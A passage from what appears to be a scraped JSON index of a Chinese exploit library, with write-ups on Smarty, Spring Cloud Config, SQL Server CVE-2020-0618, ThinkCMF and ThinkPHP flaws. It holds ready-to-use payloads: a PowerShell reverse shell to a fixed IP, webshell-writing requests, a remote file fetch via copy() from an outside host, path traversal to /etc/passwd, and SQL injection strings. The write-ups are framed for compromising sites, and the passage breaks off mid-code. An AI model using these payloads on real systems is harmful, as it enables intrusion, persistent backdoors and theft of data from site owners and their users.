方法分别进行了：生成compile文件名、写入compile文件并包含两个操作。 在第一个操作：生成compile文件名时，我们传入 display 的参数会影响最终的 compile 文件名。例如下面两个 payload 生成的文件名是不一样的。 # 代码：$smarty->display('username:'.$_GET['mochazz']); # payload1：http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();/* 4f97532c32c10229713a39421c918cf16663bf6e_0.username.*.php # payload2：http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();// 1e95a2d156a7edd4f6130643849a588dce4acb27_0.username.phpinfo();.php 这是因为 compile 文件名中，有一部分由 basename($source->name) 决定，这部分就是我们传入的 mochazz 参数。使用上面第一个 payload 时，文件名就会包含 号。在 Linux 系统下，文件名允许包含 号，但是 Windows 却不允许，这也是网络上部分文章说这个漏洞无法在 Windows 平台下利用。但是我们使用第二个 payload ，两个平台就都可以利用。 我们接着看第二个操作：写入 compile 文件并包含。首先，写入 compile 文件中的内容包含模板路径（即下图最后一行代码 $_template->source->filepath ），这个模板路径就是我们传入 display 方法的参数。虽然该参数被注释包裹，但是我们可以用 */ 闭合。写入 compile 文件，程序就开始包含该文件，最终导致代码执行（下图第137行）。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Spring Cloud Config Server/1.html":{"url":"0day/Spring Cloud Config Server/1.html","title":"（CVE-2019-3799）任意文件读取 ","keywords":"","body":"（CVE-2019-3799）任意文件读取 一、漏洞简介 二、漏洞影响 Spring Cloud Config 2.1.0 to 2.1.1 Spring Cloud Config 2.0.0 to 2.0.3 Spring Cloud Config 1.4.0 to 1.4.5 其他不受支持的老版本 （如Spring Cloud Config1.3及其以下版本） 三、复现过程 /test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-03 23:28:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/SQL Server/CVE-2020-0618.html":{"url":"0day/SQL Server/CVE-2020-0618.html","title":"（CVE-2020-0618）SQL Server 远程代码执行漏洞 ","keywords":"","body":"（CVE-2020-0618）SQL Server 远程代码执行漏洞 一、漏洞简介 该漏洞需要经过身份验证后，攻击者向 SQL Server 的报告服务(Reporting Services) 发送特制请求进行触发。攻击成功可获得SQL Server服务的对应控制权限。 二、漏洞影响 产品 版本 修复补丁编号 SQL Server 2016 Service Pack 2(GDR) 13.0.5026.0 - 13.0.5101.9 KB4505220 SQL Server 2016 Service Pack 2 CU11 13.0.5149.0 - 13.0.5598.27 KB4527378 SQL Server 2014 Service Pack 3 (GDR) 12.0.6024.0 - 12.0.6108.1 KB4505218 Server 2014 Service Pack 2 CU4 12.0.6205.1 - 12.0.6329.1 KB4500181 SQL Server 2012 Service Pack 4 (QFE) 11.0.7001.0 - 11.0.7462.6 KB4057116 三、复现过程 首先登陆 ReportServer/pages/ReportViewer.aspx POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded Content-Length: X NavigationCorrector$PageState=NeedsCorrection&NavigationCorrector$ViewState=[PayloadHere]&__VIEWSTATE= 可以在PowerShell中使用以下命令来使用ysoserial.net工具生成有效负载： $command = '$client = New-Object System.Net.Sockets.TCPClient(\"192.168.6.135\",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) .\\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"powershell.exe -encodedCommand $encodedCommand\" -o base64 | clip 编译好的ysoserial.net下载地址：https://github.com/ianxtianxt/ysoserial.net/ ps：上述命令在powershell里面执行好后，会自动黏贴到剪贴板上。 参考链接 https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-24 14:30:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ThinkCMF/1.html":{"url":"0day/ThinkCMF/1.html","title":"ThinkCMF 框架上的任意内容包含漏洞","keywords":"","body":"ThinkCMF 框架上的任意内容包含漏洞 一、漏洞简介 二、漏洞影响 ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF X2.2.2 三、复现过程 根据index.php中的配置，他的项目路径为application，打开 Portal 下的 Controller 目录，选择一个控制类文件。 发现他的父类为Common\\Controller\\HomebaseController。 在HomeBaseController中加入如下测试代码 ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。 由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。 http://127.0.0.1/cmfx-master/?a=test_public&arg1=run%20success HomeBaseController类中有一些访问权限为public的函数， 重点关注display函数.看描述就是可以自定义加载模版，通过 $this->parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。 然后调用THinkphp Controller 函数的display方法 /** * 加载模板和页面输出 可以返回输出内容 * @access public * @param string $templateFile 模板文件名 * @param string $charset 模板输出字符集 * @param string $contentType 输出类型 * @param string $content 模板输出内容 * @return mixed */ public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') { parent::display($this->parseTemplate($templateFile), $charset, $contentType,$content,$prefix); } 再往下就是调用Think View的fetch方法，这里的TMPL_ENGINE_TYPE 为Think, 最终模版内容解析在ParseTemplateBehavior中完成 如下调用即可加载任意文件 http://0-sec.org:81/cmfx-master/?a=display&templateFile=README.md 往下面翻阅发现还有fetch方法，display方法相对fetch只是多了一个render的过程，而且这里不需要知道文件路径 最终完美payload http://0-sec.org/?a=fetch&templateFile=public/index&prefix=''&content=file_put_contents('test.php','') 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-17 22:10:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ThinkCMF/THINKCMFX_2.2.3漏洞合集.html":{"url":"0day/ThinkCMF/THINKCMFX_2.2.3漏洞合集.html","title":"THINKCMFX_2.2.3漏洞合集","keywords":"","body":"ThinkCMF 2.2.3 漏洞合集 一、漏洞简介 二、漏洞影响 ThinkCMF 2.x 三、复现过程 0x01 前台用户文章编辑提交存在注入 0x01.1 漏洞演示 前台的文章编辑中操作框架注入，所以可以直接sql注入 url:http://thinkcmf.test/index.php?g=Portal&m=Article&a=edit_post post: term:123 post[post_title]:123 post[post_title]:aaa post_title:123 post[id][0]:bind post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) 0x01.2 漏洞原理 文件：ThinkCMFX_2.2.3\\application\\Portal\\Controller\\ArticleController.class.php 方法：public function edit_post( 这里不多讲，因为没得意义。详情请看先知的历史tp漏洞，谢谢：) 0x02 前台模版注入漏洞-可getshell两处 0x02.1 Comment类模版引擎注入演示 url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=file_put_contents('test.php',' 发送之后页面http状态会为200，这样就表示成功了 简单讲解一下：content 我输入了php代码所以他会在本地跟路径创建一个一句话木马test.php 所以实战过程中。 连接马子：http://xxxxx.com/test.php 密码:11 即可getshell 0x02.2 Api类模版注入1 url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=file_put_contents('test1.php',' 同上一样，会在跟目录生成 马子 test1.php 0x02.3 漏洞原理 路径:ThinkCMFX\\application\\Comment\\Controller\\WidgetController.class.php 路径:ThinkCMFX\\application\\Api\\Controller\\PluginController.class.php 两处的漏洞原理都是一样的，所以我就选一处进行讲解了 路径:application\\Comment\\Controller\\WidgetController.class.php 方法：public function fetch() 从名字查看我们会发现他的3个参数 $templateFile=模版地址 $content=内容 $prefix=前缀 $templateFile就是我们要包含的文件了，我们必须包含一个不然，代码会报错，导致无法写shell $content 我们写马子的地方 $prefix 忽略他即可，没有用的 在代码中我们看到一个 $templateFile 给parseTemplate函数包含了，这里我们也不用管他，因为他的作用就是判断一下文件是否存在而已，所以我们在实战的时候，可以找到一处html文件包含即可 而tp的模版引擎 使用的是 smarty 而smarty中只要可控制内容的key 与 value 即可写入shell命令，所以同理可得，tp的 $content 我们可控 = 有模版注入 0x03 任意文件删除-只能windows删除 0x03.1 漏洞演示 url：http://thinkcmf.test/index.php?g=User&m=Profile&a=do_avatar post: mgurl=..\\..\\..\\..\\..\\1.txt 0x03.2 漏洞原理 路径：ThinkCMFX\\application\\User\\Controller\\ProfileController.class.php 方法：blic function do_avatar( 从文件可以看到 $imgurl=str_replace('/','',$imgurl); 过滤了 / 但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数 imgurl 带入函数sp_delete_avatar 跟进去 路径：ThinkCMFX\\application\\Common\\Common\\function.php 方法：function sp_delete_avatar( 0x04 前台任意上传漏洞 0x04.1 漏洞演示 记得一定要登录! 记得一定要登录! 记得一定要登录! 记得在前台注册一个账号进行登录或是直接登录后台然后在访问此地址 打开url: http://atest.test/cms/ThinkCMFX_2.2.3/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile POST: file = php一句话木马的文件 1.php shell地址: http://atest.test/cms/ThinkCMFX_2.2.3/data/upload/ueditor/20190724/5d3833dcce7e3.php?1=phpinfo(); 0x04.2 为什么要登录 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：public function _initialize() 0x04.3 漏洞原理 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：public function upload( 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：private function _ueditor_upload 该方法使用 $upload_setting=sp_get_upload_setting(); 先获取所有上传的配置 在用 $allowed_exts=explode(',', $upload_setting[$filetype]); 来获取允许上传的后缀 这里我们先跟进去查看 sp_get_upload_setting(); 函数 路径：application\\Common\\Common\\function.php 方法：function sp_get_upload_setting() 接下来我们需要重点查看一下：$upload_setting[$filetype] 我们可以打印一下,看看他的返回值 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload( 代码: $upload_setting[$filetype] 然后我们在看看他的代码 $allowed_exts=explode(',', $upload_setting[$filetype]); 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload( 代码: $allowed_exts=explode(',', $upload_setting[$filetype]); $upload_setting[$filetype] 执行以后返回的结果是数组并且为2: array(2) { [\"upload_max_filesize\"]=> string(5) \"10240\" [\"extensions\"]=> string(42) \"txt,pdf,doc,docx,xls,xlsx,ppt,pptx,zip,rar\" } 而这里用了php函数: explode 让我们看看这个函数的作用 把字符串转成数组,可是他返回的就是数组所以 $allowed_exts=explode(',', $upload_setting[$filetype]); 执行返回空 让我们测试一下看看 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload() 跟进去tp的上传方法查看一下 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：public function upload() 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：private function check() 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：private function checkExt() 因为这里返回了true所以实际上他并没有验证后缀 所以我们也就多了一个任意文件上传漏洞 0x05 使用说明 前面说了，thinkcmf 并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。 1，看logo 3的logo是黄色的例如下图 2，在网站url 后面输入 admin 如果页面是蓝色的表示是3的，可日穿之 3，查看 README.md 在网站url后面输入README.md 另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个错 url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=file_put_contents('test.php',' 请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可 例如： /../public/index /../public/exception /../data/index /../data/runtime/index /../plugins/Mobileverify/View/admin_index /../plugins/Mobileverify/View/index /../plugins/Mobileverify/View/widget /../plugins/Demo/View/admin_index /../plugins/Demo/View/index /../plugins/Demo/View/widget /../application/Install/View/Public/footer /../application/Install/View/Public/head /../application/Install/View/Public/header /../application/Common/index /../application/Portal/Lang/en-us/index /../application/Api/Lang/en-us/index /../application/Api/Lang/zh-cn/index /../application/Comment/Lang/en-us/index /../application/Comment/Lang/zh-cn/index url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=file_put_contents('test1.php',' /../../../public/index /../../../public/exception /../../../data/index /../../../data/runtime/index /../../../plugins/Mobileverify/View/admin_index /../../../plugins/Mobileverify/View/index /../../../plugins/Mobileverify/View/widget /../../../plugins/Demo/View/admin_index /../../../plugins/Demo/View/index /../../../plugins/Demo/View/widget /../../../application/Install/View/Public/footer /../../../application/Install/View/Public/head /../../../application/Install/View/Public/header /../../../application/Common/index /../../../application/Portal/Lang/en-us/index /../../../application/Api/Lang/en-us/index /../../../application/Api/Lang/zh-cn/index /../../../application/Comment/Lang/en-us/index /../../../application/Comment/Lang/zh-cn/index 还有最后一句废话：模版注入对于linux 并不好用 : ) 差不多了，剩下的自己去thinkcmf里面自己找 四、参考链接 文章来源于https://www.yuque.com/pmiaowu/bfgkkh/aiiak1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 21:28:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ThinkCMF/CVE-2019-7580.html":{"url":"0day/ThinkCMF/CVE-2019-7580.html","title":"（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞","keywords":"","body":"（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞 一、漏洞简介 二、漏洞影响 ThinkCMF 5.0.190111 三、复现过程 0x01 利用过程： 后台登录状态下， 1、将payload插入数据库并读取然后写入data/conf/route.php文件 POST /portal/admin_category/addpost.html HTTP/1.1 Host: www.0-sec.org Content-Length: 183 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin Connection: close parent_id=0&name=111&alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2 2、然后访问： /portal/admin_category/index.html 触发 include data/conf/route.php 操作，执行payload。下图以执行sleep(5)作为演示。 补充 poc只是phpinfo,用eval一句话，或者用fputs写马 等都会报错 直接getshell exp 1'=>array(\"\",\"\"),copy(\"http://t00ls.com/1.txt\",\"1.php\"),'2 这样网站也会崩掉 但是会再public下生成1.php 得快速连上，再清空thinkcmf\\data\\conf\\route.php 文件 网站方可恢复正常 0x02 利用过程与分析 1、将payload插入数据库，写入data/conf/route.php文件 程序的入口是index.php,在index.php中\\think\\App::run()执行应用。 在App.php的run()函数139行，执行sef::exec(); 通过解析url，得到处理此次请求的控制器、类、函数，即AdminCategoryController.php的addPost函数。然后调用self::invokeMethod()。 通过反射执行AdminCategoryController.php的addPost函数。 在addPost函数中，从$this->request->param()函数中得到请求中的参数传递给$data。 然后通过$this->validata调用父类(./simplewind/thinkphp/library/think/Controller.php)的validata函数进行过滤。然后将$data传入./app/portal/model/PortalCategoryModel.php的addCategory函数进行实际的\"添加分类\"操作。 在addCategory函数中，184行这一句： $findRoute = $this->where('full_url', $fullUrl)->find(); 通过查询数据中是否存在对应的url，由于是第一次插入，所以这里并没有查到。 154行和155行通过setRoute函数对数据库进行了两次插入操作。 根入setRoute函数， 其中$fullUrl和$url的值如截图所示。 继续跟， 在34行从数据库中查询查询相关数据， $routes = $this->where(\"status\", 1)->order(\"list_order asc\")->select(); 在addCategory函数的157行调用 $routeModel->getRoutes(true); 最终得到$allroutes的值,创建data/conf目录，然后拼接待写入的route.php文件的完整路径，最后调用file_put_contents()完成写入。可见这个漏洞在于没有对alias参数中的单引号进行过滤，导致可通过闭合前后的单引号插入用户可控的payload。 写入前后对比如下： 2、触发payload执行 带着登录的cookie访问/portal/admin_category/index.html，调用routeCheck函数进行url路由检测 这里先 include app/route.php 然后， include data/conf/route.php 最终执行我们的payload：phpinfo()。 参考链接 https://xz.aliyun.com/t/3997#toc-6 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 18:51:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/1.html":{"url":"0day/Thinkphp/1.html","title":"Thinkphp专用shell","keywords":"","body":"Thinkphp 专用shell 一、漏洞简介 基于thinkphp框架的一句话写法 thinkphp框架使用入口文件调用控制器，直接写一句话可能会有解析问题导致无法执行指令，研究了一下把一句话套入框架控制器的方法，分享给大家参考， 二、漏洞影响 三、复现过程 在index的控制器文件夹下建立Test.php文件，代码如下: 一句话的地址就是http://www.0-sec.org/index/test/test 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:02:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP3/Thinkphp 3.x order by 注入漏洞.html":{"url":"0day/Thinkphp/ThinkPHP3/Thinkphp 3.x order by 注入漏洞.html","title":"Thinkphp 3.x order by 注入漏洞","keywords":"","body":"Thinkphp 3.x order by 注入漏洞 一、漏洞简介 ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。 二、漏洞影响 ThinkPHP 3.2.3、5.1.22及以下版本。 三、复现过程 ThinkPHP3.2.3漏洞代码（/Library/Think/Db/Driver.class.php）： ThinkPHP 5.1.22漏洞代码（framework/library/think/db/Query.php）： 从上面漏洞代码可以看出，当$field参数为关联数组（key-value）时，key值拼接到返回值中，SQL语句最终绕过了框架安全过滤得以执行。 ThinkPHP 3.2.3 访问如下URL即可进行漏洞利用： http://www.0-sec.org/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1 参考链接 https://mp.weixin.qq.com/s?__biz=MzIwNTcxNTczMQ==&mid=2247483907&idx=1&sn=3c1f9874878c92d10cff30c1c263fa8a&scene=21#wechat_redirect 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 16:21:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP3/Thinkphp 3.2.3 update注入漏洞.html":{"url":"0day/Thinkphp/ThinkPHP3/Thinkphp 3.2.3 update注入漏洞.html","title":"Thinkphp 3.2.3 update注入漏洞","keywords":"","body":"Thinkphp 3.2.3 update注入漏洞 一、漏洞简介 thinkphp是国内著名的php开发框架，有完善的开发文档，基于MVC架构，其中Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是普及度高于新出的thinkphp5系列，由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入。 二、漏洞影响 三、复现过程 这个问题很早之前就注意到了，只是一直没找到更常规的写法去导致注入的产生，在挖掘框架漏洞的标准是在使用官方的标准开发方式的前提下也会产生可以用的漏洞，这样才算框架级漏洞，跟普通的业务代码漏洞是有严格界线的。 thinkphp系列框架过滤表达式注入多半采用I函数去调用think_filter function think_filter(&$value){ if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)) 有没有相关tips来达到I函数绕过呢？是可以的。 http://document.thinkphp.cn/manual_3_2.html#update_data 一般按照官方的写法，thinkphp提供了数据库链式操作，其中包含连贯操作和curd操作，在进行数据库CURD操作去更新数据的时候： 举例update数据操作。 where制定主键的数值，save方法去更新变量传进来的参数到数据库的指定位置。 public function where($where,$parse=null){ if(!is_null($parse) && is_string($where)) { if(!is_array($parse)) { $parse = func_get_args(); array_shift($parse); } $parse = array_map(array($this->db,'escapeString'),$parse); $where = vsprintf($where,$parse); }elseif(is_object($where)){ $where = get_object_vars($where); } if(is_string($where) && '' != $where){ $map = array(); $map['_string'] = $where; $where = $map; } if(isset($this->options['where'])){ $this->options['where'] = array_merge($this->options['where'],$where); }else{ $this->options['where'] = $where; } return $this; } 通过where方法获取where()链式中进来的参数值，并对参数进行检查，是否为字符串，tp框架默认是对字符串进行过滤的 public function save($data='',$options=array()) { if(empty($data)) { // 没有传递数据，获取当前数据对象的值 if(!empty($this->data)) { $data = $this->data; // 重置数据 $this->data = array(); }else{ $this->error = L('_DATA_TYPE_INVALID_'); return false; } } // 数据处理 $data = $this->_facade($data); if(empty($data)){ // 没有数据则不执行 $this->error = L('_DATA_TYPE_INVALID_'); return false; } // 分析表达式 $options = $this->_parseOptions($options); $pk = $this->getPk(); if(!isset($options['where']) ) { // 如果存在主键数据 则自动作为更新条件 if (is_string($pk) && isset($data[$pk])) { $where[$pk] = $data[$pk]; unset($data[$pk]); } elseif (is_array($pk)) { // 增加复合主键支持 foreach ($pk as $field) { if(isset($data[$field])) { $where[$field] = $data[$field]; } else { // 如果缺少复合主键数据则不执行 $this->error = L('_OPERATION_WRONG_'); return false; } unset($data[$field]); } } if(!isset($where)){ // 如果没有任何更新条件则不执行 $this->error = L('_OPERATION_WRONG_'); return false; }else{ $options['where'] = $where; } } if(is_array($options['where']) && isset($options['where'][$pk])){ $pkValue = $options['where'][$pk]; } if(false === $this->_before_update($data,$options)) { return false; } $result = $this->db->update($data,$options); if(false !== $result && is_numeric($result)) { if(isset($pkValue)) $data[$pk] = $pkValue; $this->_after_update($data,$options); } return $result; } 再来到save方法，通过前面的数据处理解析服务端数据库中的数据字段信息，字段数据类型，再到_parseOptions表达式分析，获取到表名，数据表别名，记录操作的模型名称，再去调用回调函数进入update 我们这里先直接看框架的where子单元函数，之前网上公开的exp表达式注入就是从这里分析出来的结论： Thinkphp/Library/Think/Db/Driver.class.php // where子单元分析 protected function parseWhereItem($key,$val) { $whereStr = ''; if(is_array($val)) { if(is_string($val[0])) { $exp = strtolower($val[0]); if(preg_match('/^(eq|neq|gt|egt|lt|elt)$/',$exp)) { // 比较运算 $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($val[1]); }elseif(preg_match('/^(notlike|like)$/',$exp)){// 模糊查找 if(is_array($val[1])) { $likeLogic = isset($val[2])?strtoupper($val[2]):'OR'; if(in_array($likeLogic,array('AND','OR','XOR'))){ $like = array(); foreach ($val[1] as $item){ $like[] = $key.' '.$this->exp[$exp].' '.$this->parseValue($item); } $whereStr .= '('.implode(' '.$likeLogic.' ',$like).')'; } }else{ $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($val[1]); } }elseif('bind' == $exp ){ // 使用表达式 $whereStr .= $key.' = :'.$val[1]; }elseif('exp' == $exp ){ // 使用表达式 $whereStr .= $key.' '.$val[1]; }elseif(preg_match('/^(notin|not in|in)$/',$exp)){ // IN 运算 if(isset($val[2]) && 'exp'==$val[2]) { $whereStr .= $key.' '.$this->exp[$exp].' '.$val[1]; }else{ if(is_string($val[1])) { $val[1] = explode(',',$val[1]); } $zone = implode(',',$this->parseValue($val[1])); $whereStr .= $key.' '.$this->exp[$exp].' ('.$zone.')'; } }elseif(preg_match('/^(notbetween|not between|between)$/',$exp)){ // BETWEEN运算 $data = is_string($val[1])? explode(',',$val[1]):$val[1]; $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($data[0]).' AND '.$this->parseValue($data[1]); }else{ E(L('_EXPRESS_ERROR_').':'.$val[0]); } }else { $count = count($val); $rule = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : '' ; if(in_array($rule,array('AND','OR','XOR'))) { $count = $count -1; }else{ $rule = 'AND'; } for($i=0;$iparseWhereItem($key,$val[$i]).' '.$rule.' '; } } $whereStr = '( '.substr($whereStr,0,-4).' )'; } }else { //对字符串类型字段采用模糊匹配 $likeFields = $this->config['db_like_fields']; if($likeFields && preg_match('/^('.$likeFields.')$/i',$key)) { $whereStr .= $key.' LIKE '.$this->parseValue('%'.$val.'%'); }else { $whereStr .= $key.' = '.$this->parseValue($val); } } return $whereStr; } 其中除了exp能利用外还有一处bind，而bind可以完美避开了think_filter： elseif('bind' == $exp ){ // 使用表达式 $whereStr .= $key.' = :'.$val[1]; }elseif('exp' == $exp ){ // 使用表达式 $whereStr .= $key.' '.$val[1]; 这里由于拼接了$val参数的形式造成了注入，但是这里的bind表达式会引入:符号参数绑定的形式去拼接数据，通过白盒对几处CURD操作函数进行分析定位到update函数，insert函数会造成sql注入，于是回到上面的updateh函数。 Thinkphp/Library/Think/Db/Driver.class.php /** * 更新记录 * @access public * @param mixed $data 数据 * @param array $options 表达式 * @return false | integer */ public function update($data,$options) { $this->model = $options['model']; $this->parseBind(!empty($options['bind'])?$options['bind']:array()); $table = $this->parseTable($options['table']); $sql = 'UPDATE ' . $table . $this->parseSet($data); if(strpos($table,',')){// 多表更新支持JOIN操作 $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:''); } $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:''); if(!strpos($table,',')){ // 单表更新支持order和lmit $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'') .$this->parseLimit(!empty($options['limit'])?$options['limit']:''); } $sql .= $this->parseComment(!empty($options['comment'])?$options['comment']:''); return $this->execute($sql,!empty($options['fetch_sql']) ? true : false); } 跟进execute函数： public function execute($str,$fetchSql=false) { $this->initConnect(true); if ( !$this->_linkID ) return false; $this->queryStr = $str; if(!empty($this->bind)){ $that = $this; $this->queryStr = strtr($this->queryStr,array_map(function($val) use($that){ return '''.$that->escapeString($val).'''; },$this->bind)); } if($fetchSql){ return $this->queryStr; } 这里有处对$this->queryStr进行字符替换的操作： $this->queryStr = strtr($this->queryStr,array_map(function($val) use($that){ return '''.$that->escapeString($val).'''; },$this->bind)); 具体是什么，我这里写了一个实例： 常规的跟新数据库用户信息的操作： Application/Home/Controller/UserController.class.php where($user)->save($data); var_dump($valu); } } 根据进来的id更新用户的名字和钱，构造一个简单一个poc id[]=bind&id[]=1’&money[]=1123&user=liao 当走到execute函数时sql语句为： UPDATE `member` SET `user`=:0 WHERE `id` = :1' 然后$that = $this 然后下面的替换操作是将”:0”替换为外部传进来的字符串，这里就可控了。 替换后： 明显发现之前的user参数为:0然后被替换为了liao，这样就把:替换掉了。 后面的:1明显是替换不掉的： 那么我们将id[1]数组的参数变为0呢？ id[]=bind&id[]=0%27&money[]=1123&user=liao 果然造成了注入： poc money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1)) 参考链接 https://www.anquanke.com/post/id/104847 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 15:39:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP3/Thinkphp 3.2.3 select&find&delete 注入漏洞.html":{"url":"0day/Thinkphp/ThinkPHP3/Thinkphp 3.2.3 select&find&delete 注入漏洞.html","title":"Thinkphp 3.2.3 select&find&delete 注入漏洞","keywords":"","body":"Thinkphp 3.2.3 select&find&delete 注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 通过github上的commit 对比其实可以粗略知道，此次更新主要是在ThinkPHP/Library/Think/Model.class.php文件中，其中对于delete，find，select三个函数进行了修改。 delete函数 select函数 find函数 对比三个方法修改的地方都有一个共同点： 把外部传进来的$options，修改为$this->options，同时不再使用$this->_parseOptions对于$options进行表达式分析。 思考是因为$options可控，再经过_parseOptions函数之后产生了sql注入。 一 select 和 find 函数 以find函数为例进行分析（select代码类似），该函数可接受一个$options参数，作为查询数据的条件。 当$options为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段： if (is_numeric($options) || is_string($options)) { $where[$this->getPk()] = $options; $options = array(); $options['where'] = $where; } 同时提供了对复合主键的查询，看到判断： if (is_array($options) && (count($options) > 0) && is_array($pk)) { // 根据复合主键查询 ...... } 要进入复合主键查询代码，需要满足$options为数组同时$pk主键也要为数组，但这个对于表只设置一个主键的时候不成立。 那么就可以使$options为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入_parseOptions进行解析。 if (is_numeric($options) || is_string($options)) {//$options为数组不进入 $where[$this->getPk()] = $options; $options = array(); $options['where'] = $where; } // 根据复合主键查找记录 $pk = $this->getPk(); if 